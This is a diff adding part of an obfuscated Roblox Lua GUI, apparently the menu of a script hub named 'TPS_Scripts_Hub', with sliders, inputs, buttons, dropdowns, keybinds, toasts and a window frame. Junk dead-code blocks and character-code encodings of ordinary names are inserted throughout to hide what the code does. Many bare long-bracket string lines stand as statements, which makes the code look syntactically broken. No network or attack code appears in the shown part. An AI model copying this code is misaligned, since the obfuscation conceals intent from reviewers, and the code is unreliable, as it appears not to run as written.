+[==[ _a74018_ ]==]
+    local pct=(val-min)/(max-min)
+    local fill=frame({Size=UDim2.new(pct,0,1,0),BackgroundColor3=CFG.C.Accent,BorderSizePixel=0,Parent=trackBg}); 
+    corner(fill,isMobile and 4 or 3)
+    local thumb=frame({Size=UDim2.new(0,isMobile and 22 or 13,0,isMobile and 22 or 13),AnchorPoint=Vector2.new(.5,.5),Position=UDim2.new(pct,0,.5,0),BackgroundColor3=CFG.C.Text,BorderSizePixel=0,Parent=trackBg}); 
+    corner(thumb,isMobile and 11 or 7)
+    
+if false then local ujhb_1e18=5183 end
+    local dragging=false
+    local function handleInput(input)
+if false then local _a85818_=1655 end
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+do local _ruhafupwaiS=nil end
+            local x = input.Position.X
+do local _lulejoOLo=nil end
+            local p2 = math.clamp((x - trackBg.AbsolutePosition.X) / trackBg.AbsoluteSize.X, 0, 1)
+            val = roundVal(min + (max - min) * p2)
+[==[ zozgttrr_1eb7 ]==]
+            fill.Size = UDim2.new(p2, 0, 1, 0)
+            thumb.Position = UDim2.new(p2, 0, .5, 0)
+            valLbl.Text = fmtVal(val)
+            if callback then callback(val) end
+do local __12351_=nil end
+            dragging = true
+        end
+    end
+    
+if false then local _a7276e_=3079 end
+    trackBg.InputBegan:Connect(handleInput)
+    thumb.InputBegan:Connect(handleInput)
+    
+do local _rcshin_a1b4=nil end
+    UserInputService.InputEnded:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+do local __39e202_=nil end
+            dragging = false
+        end
+[==[ _64a816_ ]==]
+    end)
+    
+    UserInputService.InputChanged:Connect(function(i)
+[==[ wlgbf_634d ]==]
+        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+            local p2 = math.clamp((i.Position.X - trackBg.AbsolutePosition.X) / trackBg.AbsoluteSize.X, 0, 1)
+            val = roundVal(min + (max - min) * p2)
+if false then local tekutw5r=4996 end
+            fill.Size = UDim2.new(p2, 0, 1, 0)
+            thumb.Position = UDim2.new(p2, 0, .5, 0)
+if false then local ymbc_93ee=5060 end
+            valLbl.Text = fmtVal(val)
+if false then local ronoqmlm=8178 end
+            if callback then callback(val) end
+        end
+do local _rquhtba_0e00=nil end
+    end)
+    
+    return function() return val end
+end
+
+local function makeInput(parent,lbl,placeholder,order,callback)
+if false then local _eabd63_=9630 end
+    local row=makeRow(parent,isMobile and 80 or 66,order)
+    label({Size=UDim2.new(1,0,0,isMobile and 22 or 18),Position=UDim2.new(0,0,0,4),BackgroundTransparency=1,Text=lbl,TextColor3=CFG.C.SubText,Font=F.Body,TextSize=isMobile and 13 or 11,TextXAlignment=Enum.TextXAlignment.Left,Parent=row})
+    local box=frame({Size=UDim2.new(1,0,0,isMobile and 44 or 34),Position=UDim2.new(0,0,isMobile and 28 or 24),BackgroundColor3=CFG.C.Input,BackgroundTransparency=0.18,BorderSizePixel=0,Parent=row}); 
+do local _ztxacd_2009=nil end
+    corner(box,isMobile and 10 or 8)
+    local bstroke=stroke(box,CFG.C.Border,1,1)
+    local bglow=Instance.new((function() return string.char(0x55, 0x49, 0x53, 0x74, 0x72, 0x6f, 0x6b, 0x65) end)()); 
+    bglow.Color=CFG.C.Accent; 
+    bglow.Thickness=isMobile and 3 or 2.2; 
+if false then local gvqwc_91f3=3529 end
+    bglow.Transparency=1; 
+if false then local _7c62d8_=6864 end
+    bglow.ApplyStrokeMode=Enum.ApplyStrokeMode.Border; 
+    bglow.Parent=box
+if false then local njdsogbp_6459=1802 end
+    local tb=Instance.new((function() return string.char(84, 101, 120, 116, 66, 111, 120) end)()); 
+    tb.Size=UDim2.new(1,-14,1,0); 
+    tb.Position=UDim2.new(0,10,0,0); 
+    tb.BackgroundTransparency=1
+    tb.Text=""; 
+    tb.PlaceholderText=placeholder or (function() local t=[84, 121, 112, 101, 32, 104, 101, 114, 101, 46, 46, 46] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(); 
+do local _wncguznm_16cd=nil end
+    tb.PlaceholderColor3=CFG.C.SubText; 
+do local _mexabaE0Y=nil end
+    tb.TextColor3=CFG.C.Text
+    tb.Font=F.Body; 
+[==[ nahutR ]==]
+    tb.TextSize=isMobile and 16 or 13; 
+    tb.TextXAlignment=Enum.TextXAlignment.Left; 
+    tb.ClearTextOnFocus=false; 
+    tb.Parent=box
+do local _kqmymg_f41c=nil end
+    tb.Focused:Connect(function() 
+[==[ necotah9 ]==]
+        tw(bstroke,{Color=CFG.C.Accent,Transparency=0.2},.2); 
+        tw(bglow,{Transparency=0.72},.25) 
+    end)
+    tb.FocusLost:Connect(function(enter) 
+if false then local dckrtzj_c293=9963 end
+        tw(bstroke,{Transparency=1},.2); 
+[==[ xofiETGwQ ]==]
+        tw(bglow,{Transparency=1},.2); 
+        if callback then callback(tb.Text,enter) end 
+    end)
+    return tb
+end
+
+if false then local _5aed9a_=575 end
+local function makeButton(parent,lbl,sublbl,style,order,callback)
+    local h=sublbl and (isMobile and 70 or 56) or (isMobile and 56 or 44)
+do local _dlqi_dae0=nil end
+    local row=makeRow(parent,h,order)
+    local col=style==(function() return string.char(0x64, 0x61, 0x6e, 0x67, 0x65, 0x72) end)() and CFG.C.Red or style==(function() return string.char(103, 104, 111, 115, 116) end)() and CFG.C.Card or CFG.C.Accent
+    local colH=style==(function() local t=[100, 97, 110, 103, 101, 114] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)() and Color3.fromRGB(175,48,48) or style==(function() return string.char(0x67, 0x68, 0x6f, 0x73, 0x74) end)() and CFG.C.ActiveBg or CFG.C.AccentD
+do local _vcjkbyuy_4c45=nil end
+    local btn=Instance.new((function() return string.char(84, 101, 120, 116, 66, 117, 116, 116, 111, 110) end)()); 
+    btn.Size=UDim2.new(1,0,0,sublbl and (isMobile and 54 or 44) or (isMobile and 42 or 32)); 
+    btn.Position=UDim2.new(0,0,0,isMobile and 8 or 6)
+    btn.BackgroundColor3=col; 
+do local __67bca8_=nil end
+    btn.BackgroundTransparency=style==(function() local t=[103, 104, 111, 115, 116] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)() and 0.55 or 0; 
+[==[ _1680b8_ ]==]
+    btn.BorderSizePixel=0; 
+    btn.AutoButtonColor=false
+do local __43221e_=nil end
+    btn.Text=sublbl and "" or lbl; 
+[==[ _7fcc27_ ]==]
+    btn.TextColor3=CFG.C.Text; 
+if false then local mihajuyioDqs6=2537 end
+    btn.Font=F.Bold; 
+[==[ inogpxki_a65b ]==]
+    btn.TextSize=isMobile and 16 or 13; 
+    btn.Parent=row; 
+    corner(btn,isMobile and 10 or 8)
+    if style==(function() return string.char(0x67, 0x68, 0x6f, 0x73, 0x74) end)() then stroke(btn,CFG.C.Border,1,0.62) end
+do local _givuanWQX=nil end
+    local bnglow=nil
+do local __6d870c_=nil end
+    if style~=(function() return string.char(103, 104, 111, 115, 116) end)() then
+if false then local tgjbfnz_e2b1=2453 end
+        bnglow=Instance.new((function() local t=[85, 73, 83, 116, 114, 111, 107, 101] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()); 
+        bnglow.Color=style==(function() return string.char(0x64, 0x61, 0x6e, 0x67, 0x65, 0x72) end)() and CFG.C.Red or CFG.C.Accent; 
+if false then local jzpu_f8f0=6402 end
+        bnglow.Thickness=isMobile and 3 or 2.5; 
+        bnglow.Transparency=1; 
+[==[ qoye1aWh ]==]
+        bnglow.ApplyStrokeMode=Enum.ApplyStrokeMode.Border; 
+        bnglow.Parent=btn
+    end
+[==[ _5de110_ ]==]
+    if sublbl then
+do local _zozomeNB=nil end
+        label({Size=UDim2.new(1,0,0,isMobile and 22 or 18),Position=UDim2.new(0,0,0,4),BackgroundTransparency=1,Text=lbl,TextColor3=CFG.C.Text,Font=F.Bold,TextSize=isMobile and 16 or 13,TextXAlignment=Enum.TextXAlignment.Center,Parent=btn})
+if false then local khkzkvn_608c=9149 end
+        label({Size=UDim2.new(1,0,0,isMobile and 16 or 14),Position=UDim2.new(0,0,isMobile and 28 or 22),BackgroundTransparency=1,Text=sublbl,TextColor3=style==(function() return string.char(103, 104, 111, 115, 116) end)() and CFG.C.SubText or Color3.fromRGB(195,198,215),Font=F.Body,TextSize=isMobile and 12 or 10,TextXAlignment=Enum.TextXAlignment.Center,Parent=btn})
+    end
+    btn.MouseEnter:Connect(function() 
+        tw(btn,{BackgroundColor3=colH},.15); 
+if false then local liwrjtv_1ee2=3046 end
+        if bnglow then tw(bnglow,{Transparency=0.68},.18) end 
+    end)
+do local __17fc13_=nil end
+    btn.MouseLeave:Connect(function() 
+        tw(btn,{BackgroundColor3=col},.15); 
+        if bnglow then tw(bnglow,{Transparency=1},.18) end 
+    end)
+do local _zakiA5=nil end
+    btn.MouseButton1Click:Connect(function()
+[==[ qmkht_aae6 ]==]
+        tw(btn,{Size=UDim2.new(.97,0,0,sublbl and (isMobile and 50 or 42) or (isMobile and 38 or 30))},.08)
+        task.wait(0.08)
+        tw(btn,{Size=UDim2.new(1,0,0,sublbl and (isMobile and 54 or 44) or (isMobile and 42 or 32))},.15,Enum.EasingStyle.Back,Enum.EasingDirection.Out)
+        if callback then callback() end
+    end)
+    return btn
+[==[ zepi_d4e5 ]==]
+end
+
+local ActiveDropdown=nil
+[==[ qjzucktt_8c1b ]==]
+local function makeDropdown(parent,lbl,options,default,order,callback)
+    local selected=default or options[1]; 
+    local isOpen=false
+    local wrap=frame({Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,BackgroundTransparency=1,LayoutOrder=order,ClipsDescendants=false,Parent=parent})
+    padding(wrap,14,14,6,6); 
+    listLayout(wrap,nil,4)
+if false then local bibuyemoEO=4690 end
+    label({Size=UDim2.new(1,0,0,isMobile and 20 or 16),BackgroundTransparency=1,Text=lbl,TextColor3=CFG.C.SubText,Font=F.Body,TextSize=isMobile and 13 or 11,TextXAlignment=Enum.TextXAlignment.Left,LayoutOrder=1,Parent=wrap})
+    local header=Instance.new((function() local t=[84, 101, 120, 116, 66, 117, 116, 116, 111, 110] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()); 
+    header.Size=UDim2.new(1,0,0,isMobile and 44 or 34); 
+    header.BackgroundColor3=CFG.C.Input; 
+    header.BackgroundTransparency=0.18; 
+    header.BorderSizePixel=0; 
+    header.Text=""; 
+[==[ qikezuLU ]==]
+    header.AutoButtonColor=false; 
+do local _qokuhaxeEw=nil end
+    header.LayoutOrder=2; 
+    header.Parent=wrap; 
+    corner(header,isMobile and 10 or 8)
+do local _wohici52=nil end
+    local hstroke=stroke(header,CFG.C.Border,1,1)
+    local hglow=Instance.new((function() return string.char(0x55, 0x49, 0x53, 0x74, 0x72, 0x6f, 0x6b, 0x65) end)()); 
+    hglow.Color=CFG.C.Accent; 
+    hglow.Thickness=isMobile and 3 or 2.2; 
+    hglow.Transparency=1; 
+do local _bokilaSaA=nil end
+    hglow.ApplyStrokeMode=Enum.ApplyStrokeMode.Border; 
+    hglow.Parent=header
+    local selLbl=label({Size=UDim2.new(1,-36,1,0),Position=UDim2.new(0,10,0,0),BackgroundTransparency=1,Text=selected,TextColor3=CFG.C.Text,Font=F.Body,TextSize=isMobile and 16 or 13,TextXAlignment=Enum.TextXAlignment.Left,Parent=header})
+    local arrowLbl=label({Size=UDim2.new(0,24,1,0),AnchorPoint=Vector2.new(1,0),Position=UDim2.new(1,-4,0,0),BackgroundTransparency=1,Text=(function() return string.char(226, 150, 190) end)(),TextColor3=CFG.C.SubText,Font=F.Bold,TextSize=isMobile and 18 or 14,TextXAlignment=Enum.TextXAlignment.Center,Parent=header})
+do local _yuyitu9qBc=nil end
+    local listWrap=frame({Size=UDim2.new(1,0,0,0),BackgroundColor3=CFG.C.Card,BackgroundTransparency=0,BorderSizePixel=0,Visible=false,ZIndex=50,LayoutOrder=3,ClipsDescendants=true,Parent=wrap})
+    corner(listWrap,isMobile and 10 or 8); 
+    stroke(listWrap,CFG.C.Accent,1,0.62); 
+    listLayout(listWrap,nil,0); 
+[==[ dzqwo_f9c6 ]==]
+    padding(listWrap,4,4,4,4)
+do local _gsqlgkyb_a09e=nil end
+    local optBtns={}
+    for idx,opt in ipairs(options) do
+        local ob=Instance.new((function() local t=[84, 101, 120, 116, 66, 117, 116, 116, 111, 110] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()); 
+        ob.Size=UDim2.new(1,0,0,isMobile and 40 or 30); 
+do local _katawuHSw=nil end
+        ob.BackgroundColor3=(opt==selected) and CFG.C.ActiveBg or CFG.C.Card; 
+if false then local muyaBY=2342 end
+        ob.BackgroundTransparency=(opt==selected) and .2 or 1; 
+        ob.BorderSizePixel=0; 
+        ob.Text=opt; 
+if false then local _120e28_=1425 end
+        ob.TextColor3=(opt==selected) and CFG.C.Text or CFG.C.SubText; 
+[==[ jediyizuYS ]==]
+        ob.Font=F.Body; 
+do local _fetikobao8=nil end
+        ob.TextSize=isMobile and 16 or 13; 
+        ob.AutoButtonColor=false; 
+        ob.ZIndex=51; 
+[==[ fiseveIbZYp ]==]
+        corner(ob,isMobile and 8 or 6); 
+        ob.Parent=listWrap; 
+do local _gizutesat2=nil end
+        optBtns[idx]=ob
+        ob.MouseEnter:Connect(function() 
+if false then local gavanFAfs=7724 end
+            if opt~=selected then 
+do local _jqrou_f347=nil end
+                tw(ob,{BackgroundColor3=CFG.C.ActiveBg,BackgroundTransparency=.5},.12) 
+if false then local milemy=5930 end
+            end; 
+do local _rgrro_f863=nil end
+            ob.TextColor3=CFG.C.Text 
+        end)
+do local __cd725d_=nil end
+        ob.MouseLeave:Connect(function() 
+            if opt~=selected then 
+[==[ _93c990_ ]==]
+                tw(ob,{BackgroundColor3=CFG.C.Card,BackgroundTransparency=1},.12); 
+do local __a770ee_=nil end
+                ob.TextColor3=CFG.C.SubText 
+            end 
+        end)
+        ob.MouseButton1Click:Connect(function()
+if false then local jixeElZ=1141 end
+            for _,b in ipairs(optBtns) do 
+                b.BackgroundColor3=CFG.C.Card; 
+                b.BackgroundTransparency=1; 
+                b.TextColor3=CFG.C.SubText 
+            end
+            ob.BackgroundColor3=CFG.C.ActiveBg; 
+            ob.BackgroundTransparency=.2; 
+            ob.TextColor3=CFG.C.Text
+[==[ rkgulq_c748 ]==]
+            selected=opt; 
+            selLbl.Text=opt; 
+            isOpen=false; 
+            tw(hstroke,{Transparency=1},.15); 
+            tw(hglow,{Transparency=1},.15); 
+            arrowLbl.Text=(function() return string.char(0xe2, 0x96, 0xbe) end)(); 
+[==[ xociqogUau ]==]
+            listWrap.Visible=false
+            if callback then callback(opt) end
+if false then local tuneqopuka=4642 end
+        end)
+    end
+    local listH=math.min(#options,5)*(isMobile and 40 or 30)+8
+do local _fgbvxynm_356f=nil end
+    local function openDropdown()
+        if ActiveDropdown and ActiveDropdown~=listWrap then ActiveDropdown.Visible=false end
+        isOpen=true; 
+        ActiveDropdown=listWrap; 
+        listWrap.Visible=true; 
+[==[ lejoKtj ]==]
+        listWrap.Size=UDim2.new(1,0,0,0)
+        tw(listWrap,{Size=UDim2.new(1,0,0,listH)},.22,Enum.EasingStyle.Back,Enum.EasingDirection.Out)
+        tw(hstroke,{Color=CFG.C.Accent,Transparency=0.35},.15); 
+        tw(hglow,{Transparency=0.75},.2); 
+        arrowLbl.Text=(function() return string.char(226, 150, 180) end)()
+do local _obgqvi_f6ac=nil end
+    end
+    local function closeDropdown()
+        isOpen=false; 
+        tw(listWrap,{Size=UDim2.new(1,0,0,0)},.18); 
+        task.delay(.18,function() listWrap.Visible=false end)
+if false then local venoruqo73p=1976 end
+        tw(hstroke,{Transparency=1},.15); 
+do local _puyitaGkhW=nil end
+        tw(hglow,{Transparency=1},.15); 
+if false then local pamoxeguDVhF=6676 end
+        arrowLbl.Text=(function() local t=[226, 150, 190] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()
+    end
+    header.MouseButton1Click:Connect(function() 
+[==[ ricizokaYOHr6 ]==]
+        if isOpen then closeDropdown() else openDropdown() end 
+    end)
+    return function() return selected end
+end
+
+local function makeKeybind(parent,lbl,default,order,callback)
+if false then local _b62956_=3685 end
+    local current=default or Enum.KeyCode.F; 
+do local _zakay1kI=nil end
+    local listening=false; 
+    local row=makeRow(parent,isMobile and 62 or 52,order)
+    label({Size=UDim2.new(1,-90,0,isMobile and 28 or 22),Position=UDim2.new(0,0,.5,-(isMobile and 14 or 11)),BackgroundTransparency=1,Text=lbl,TextColor3=CFG.C.Text,Font=F.Body,TextSize=isMobile and 15 or 13,TextXAlignment=Enum.TextXAlignment.Left,Parent=row})
+    local chip=Instance.new((function() return string.char(0x54, 0x65, 0x78, 0x74, 0x42, 0x75, 0x74, 0x74, 0x6f, 0x6e) end)()); 
+    chip.Size=UDim2.new(0,isMobile and 100 or 80,0,isMobile and 36 or 28); 
+    chip.AnchorPoint=Vector2.new(1,.5); 
+[==[ rmqmui_d606 ]==]
+    chip.Position=UDim2.new(1,0,.5,0); 
+    chip.BackgroundColor3=CFG.C.Input; 
+[==[ ciqegIe ]==]
+    chip.BackgroundTransparency=0.18; 
+do local _ksdgu_b5ef=nil end
+    chip.BorderSizePixel=0; 
+do local _gimapjKsJ=nil end
+    chip.Text=tostring(current.Name); 
+    chip.TextColor3=CFG.C.Accent; 
+    chip.Font=F.Mono; 
+do local __6d7ed8_=nil end
+    chip.TextSize=isMobile and 14 or 12; 
+[==[ ucryjqm_c7f0 ]==]
+    chip.AutoButtonColor=false; 
+[==[ rgznxzu_d64e ]==]
+    chip.Parent=row; 
+    corner(chip,isMobile and 10 or 8); 
+    stroke(chip,CFG.C.Accent,1,0.75)
+if false then local _35421f_=6873 end
+    chip.MouseButton1Click:Connect(function() 
+if false then local _a44d72_=1233 end
+        if listening then return end; 
+        listening=true; 
+        chip.Text=(function() return string.char(46, 46, 46) end)(); 
+        tw(chip,{BackgroundColor3=CFG.C.Accent},.15); 
+        chip.TextColor3=CFG.C.Text 
+if false then local woleoAq=1587 end
+    end)
+[==[ _290e58_ ]==]
+    UserInputService.InputBegan:Connect(function(i)
+        if not listening then return end
+if false then local _b1bc77_=6390 end
+        if i.UserInputType==Enum.UserInputType.Keyboard then
+            current=i.KeyCode; 
+do local _jacijunatyPgM=nil end
+            chip.Text=i.KeyCode.Name; 
+            chip.TextColor3=CFG.C.Accent; 
+[==[ cugpime_e36d ]==]
+            tw(chip,{BackgroundColor3=CFG.C.Input},.15); 
+            listening=false; 
+            if callback then callback(current) end
+        end
+    end)
+end
+
+if false then local krvopj_a8c3=8971 end
+local function toast(title,msg,col)
+    local sg=Instance.new((function() local t=[83, 99, 114, 101, 101, 110, 71, 117, 105] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()); 
+[==[ buparevioq7 ]==]
+    sg.IgnoreGuiInset=true; 
+    sg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling; 
+do local __308d3_=nil end
+    sg.ResetOnSpawn=false; 
+    sg.Parent=PlayerGui
+    local t=frame({Size=UDim2.new(0,isMobile and 300 or 244,0,isMobile and 70 or 56),AnchorPoint=Vector2.new(.5,1),Position=UDim2.new(.5,0,0,-10),BackgroundColor3=CFG.C.Card,BackgroundTransparency=0.08,BorderSizePixel=0,ZIndex=200,Parent=sg}); 
+    corner(t,isMobile and 12 or 10); 
+    stroke(t,col or CFG.C.Accent,1,0.68)
+    local tglow=Instance.new((function() return string.char(0x55, 0x49, 0x53, 0x74, 0x72, 0x6f, 0x6b, 0x65) end)()); 
+    tglow.Color=col or CFG.C.Accent; 
+if false then local _f88b78_=4363 end
+    tglow.Thickness=isMobile and 3 or 2.5; 
+    tglow.Transparency=0.78; 
+    tglow.ApplyStrokeMode=Enum.ApplyStrokeMode.Border; 
+do local __b172f3_=nil end
+    tglow.Parent=t
+if false then local _415ec5_=5799 end
+    local bar=frame({Size=UDim2.new(0,3,0,isMobile and 44 or 34),Position=UDim2.new(0,6,0,isMobile and 13 or 11),BackgroundColor3=col or CFG.C.Accent,BorderSizePixel=0,Parent=t}); 
+do local _qihatgzyf=nil end
+    corner(bar,2)
+    label({Size=UDim2.new(1,-22,0,isMobile and 22 or 18),Position=UDim2.new(0,16,0,isMobile and 11 or 9),BackgroundTransparency=1,Text=title,TextColor3=CFG.C.Text,Font=F.Bold,TextSize=isMobile and 15 or 12,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=201,Parent=t})
+    label({Size=UDim2.new(1,-22,0,isMobile and 20 or 16),Position=UDim2.new(0,16,0,isMobile and 33 or 27),BackgroundTransparency=1,Text=msg,TextColor3=CFG.C.SubText,Font=F.Body,TextSize=isMobile and 13 or 11,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=201,Parent=t})
+if false then local wakaneTRN7b=9992 end
+    tw(t,{Position=UDim2.new(.5,0,0,isMobile and 85 or 72)},.35,Enum.EasingStyle.Back,Enum.EasingDirection.Out)
+    task.delay(3,function() 
+        tw(t,{Position=UDim2.new(.5,0,0,-10),BackgroundTransparency=1},.3); 
+if false then local hcuvv_f673=3641 end
+        task.delay(.35,function() sg:Destroy() end) 
+    end)
+end
+
+[==[ keguErK ]==]
+local ScreenGui=Instance.new((function() return string.char(83, 99, 114, 101, 101, 110, 71, 117, 105) end)()); 
+ScreenGui.Name=(function() local t=[84, 80, 83, 95, 83, 99, 114, 105, 112, 116, 115, 95, 72, 117, 98] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(); 
+if false then local kufaEtPob=9625 end
+ScreenGui.ResetOnSpawn=false; 
+ScreenGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling; 
+ScreenGui.IgnoreGuiInset=true; 
+if false then local rhqlyi_2149=8085 end
+ScreenGui.Parent=PlayerGui
+
+do local __152bb9_=nil end
+local W,H=CFG.W,CFG.H
+
+do local _mabifuveiut=nil end
+local Main=frame({Name=(function() return string.char(0x4d, 0x61, 0x69, 0x6e) end)(),Size=UDim2.new(0,W,0,H),Position=UDim2.new(.5,-W/2,.5,-H/2+18),BackgroundColor3=CFG.C.BG,BackgroundTransparency=0.08,BorderSizePixel=0,ClipsDescendants=true,Parent=ScreenGui})
+corner(Main,isMobile and 16 or 14); 
+stroke(Main,CFG.C.Border,1,0.68)
+local mainGrad=Instance.new((function() return string.char(85, 73, 71, 114, 97, 100, 105, 101, 110, 116) end)()); 
+mainGrad.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(20,16,35)),ColorSequenceKeypoint.new(1,Color3.fromRGB(10,8,18))}); 
+mainGrad.Rotation=145; 
+mainGrad.Parent=Main
+
+local TBar=frame({Name=(function() local t=[84, 105, 116, 108, 101, 66, 97, 114] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),Size=UDim2.new(1,0,0,isMobile and 54 or 44),BackgroundColor3=CFG.C.TitleBar,BackgroundTransparency=0.12,BorderSizePixel=0,ZIndex=5,Parent=Main}); 
+corner(TBar,isMobile and 16 or 14)
+frame({Size=UDim2.new(1,0,.5,2),Position=UDim2.new(0,0,.5,-1),BackgroundColor3=CFG.C.TitleBar,BackgroundTransparency=0.12,BorderSizePixel=0,ZIndex=4,Parent=TBar})
+frame({Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,0,isMobile and 54 or 44),BackgroundColor3=CFG.C.Border,BackgroundTransparency=0.55,BorderSizePixel=0,ZIndex=3,Parent=Main})
+
+local ScriptIconBg=frame({Size=UDim2.new(0,isMobile and 32 or 26,0,isMobile and 32 or 26),AnchorPoint=Vector2.new(0,.5),Position=UDim2.new(0,isMobile and 12 or 13,.5,0),BackgroundColor3=CFG.C.Accent,BackgroundTransparency=0.42,BorderSizePixel=0,ZIndex=7,Parent=TBar}); 
+corner(ScriptIconBg,isMobile and 9 or 7)
+local iconImage=Instance.new((function() return string.char(0x49, 0x6d, 0x61, 0x67, 0x65, 0x4c, 0x61, 0x62, 0x65, 0x6c) end)()); 
+if false then local _91f196_=9849 end
+iconImage.Size=UDim2.new(1,-6,1,-6); 
+iconImage.Position=UDim2.new(0,3,0,3); 
+iconImage.BackgroundTransparency=1; 
+do local _yajaceqoJ6E=nil end
+iconImage.Image=(function() return string.char(114, 98, 120, 97, 115, 115, 101, 116, 105, 100, 58, 47, 47, 55, 57, 49, 51, 56, 52, 57, 56, 57, 54, 56, 48, 48, 53) end)(); 
+iconImage.ScaleType=Enum.ScaleType.Fit; 
+[==[ _e43fe5_ ]==]
+iconImage.ZIndex=8; 
+[==[ hlzewpix_cf0a ]==]
+iconImage.Parent=ScriptIconBg
+label({Size=UDim2.new(0,isMobile and 160 or 200,0,isMobile and 32 or 26),Position=UDim2.new(0,isMobile and 54 or 48,0,isMobile and 6 or 5),BackgroundTransparency=1,Text=CFG.Name,TextColor3=CFG.C.Text,Font=F.Title,TextSize=isMobile and 18 or 16,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=6,Parent=TBar})
+label({Size=UDim2.new(0,isMobile and 50 or 40,0,isMobile and 14 or 12),Position=UDim2.new(0,isMobile and 54 or 48,.5,isMobile and 10 or 8),BackgroundTransparency=1,Text=CFG.Version,TextColor3=CFG.C.SubText,Font=F.Mono,TextSize=isMobile and 12 or 10,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=6,Parent=TBar})
+
+local BFrame=frame({Size=UDim2.new(0,isMobile and 110 or 90,0,isMobile and 20 or 16),AnchorPoint=Vector2.new(1,.5),Position=UDim2.new(1,-isMobile and 16 or 14,.5,0),BackgroundTransparency=1,ZIndex=6,Parent=TBar})
+[==[ rmrbckhk_0707 ]==]
+do local ul=Instance.new((function() local t=[85, 73, 76, 105, 115, 116, 76, 97, 121, 111, 117, 116] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)()); 
+do local _kuqx_a92f=nil end
+    ul.FillDirection=Enum.FillDirection.Horizontal; 
+    ul.Padding=UDim.new(0,isMobile and 10 or 8); 
+[==[ _190252_ ]==]
+    ul.SortOrder=Enum.SortOrder.LayoutOrder; 
+    ul.VerticalAlignment=Enum.VerticalAlignment.Center; 
+if false then local ciduguZT0v=2159 end
+    ul.Parent=BFrame 
+end
+if false then local ozohc_e77e=9059 end
+local function macBtn(color,order2)
+    local b=Instance.new((function() return string.char(0x54, 0x65, 0x78, 0x74, 0x42, 0x75, 0x74, 0x74, 0x6f, 0x6e) end)()); 
+    b.Size=UDim2.new(0,isMobile and 18 or 14,0,isMobile and 18 or 14); 
+    b.BackgroundColor3=color; 
+    b.BorderSizePixel=0; 
+if false then local mibiWJ9=4318 end
+    b.Text=""; 
+do local __d9b165_=nil end
+    b.AutoButtonColor=false; 
+    b.LayoutOrder=order2; 
+    b.ZIndex=7; 
+    b.Parent=BFrame; 
+    corner(b,isMobile and 9 or 7)
+if false then local fifopos9u=5932 end
+    b.MouseEnter:Connect(function() 
+        tw(b,{BackgroundColor3=color:Lerp(Color3.new(1,1,1),.18)},.1) 
+    end)
+[==[ duiok_ffba ]==]
+    b.MouseLeave:Connect(function() 
+        tw(b,{BackgroundColor3=color},.1) 
+    end)
+    return b
+[==[ _645caf_ ]==]
+end
+local BtnClose=macBtn(CFG.C.Close,1); 
+local BtnMinimize=macBtn(CFG.C.Minimize,2); 
+local BtnMaximize=macBtn(CFG.C.Maximize,3)
+
+local Content=frame({Name=(function() return string.char(67, 111, 110, 116, 101, 110, 116) end)(),Size=UDim2.new(1,0,1,-(isMobile and 54 or 45)),Position=UDim2.new(0,0,0,isMobile and 54 or 45),BackgroundTransparency=1,Parent=Main})
+
+[==[ yiyenovuLHLJt ]==]
+local SBW=CFG.SidebarExp
+local Sidebar=frame({Name=(function() local t=[83, 105, 100, 101, 98, 97, 114] local s='' for i=1,#t do s=s..string.char(t[i]) end return s end)(),Size=UDim2.new(0,SBW,1,0),BackgroundColor3=CFG.C.Sidebar,BackgroundTransparency=0.12,BorderSizePixel=0,ClipsDescendants=true,ZIndex=3,Parent=Content}); 
+corner(Sidebar,isMobile and 16 or 14)
+frame({Size=UDim2.new(.5,0,1,0),Position=UDim2.new(.5,0,0,0),BackgroundColor3=CFG.C.Sidebar,BackgroundTransparency=0.12,BorderSizePixel=0,ZIndex=2,Parent=Sidebar})
+frame({Size=UDim2.new(.5,0,.5,0),BackgroundColor3=CFG.C.Sidebar,BackgroundTransparency=0.12,BorderSizePixel=0,ZIndex=2,Parent=Sidebar})
+frame({Size=UDim2.new(0,1,1,0),Position=UDim2.new(1,-1,0,0),BackgroundColor3=CFG.C.Border,BackgroundTransparency=0.6,BorderSizePixel=0,ZIndex=4,Parent=Sidebar})
+
+local SBScroll=Instance.new((function() return string.char(0x53, 0x63, 0x72, 0x6f, 0x6c, 0x6c, 0x69, 0x6e, 0x67, 0x46, 0x72, 0x61, 0x6d, 0x65) end)()); 
+SBScroll.Size=UDim2.new(1,0,1,-4); 
+SBScroll.Position=UDim2.new(0,0,0,2); 
+SBScroll.BackgroundTransparency=1; 
+[==[ rimaoCd ]==]
+SBScroll.BorderSizePixel=0; 
+if false then local zadha_84ab=7261 end
+SBScroll.ScrollBarThickness=0; 
+do local _ftjdv_8410=nil end
+SBScroll.CanvasSize=UDim2.new(0,0,0,0); 
+SBScroll.AutomaticCanvasSize=Enum.AutomaticSize.Y; 
+SBScroll.ClipsDescendants=true; 
+SBScroll.ZIndex=4; 
+SBScroll.Parent=Sidebar
+do local _hgjreb_3c0a=nil end
+listLayout(SBScroll,nil,isMobile and 6 or 3); 
+padding(SBScroll,6,6,8,0)
+
+[==[ _fe3e44_ ]==]
+local TogBtn=Instance.new((function() return string.char(84, 101, 120, 116, 66, 117, 116, 116, 111, 110) end)()); 
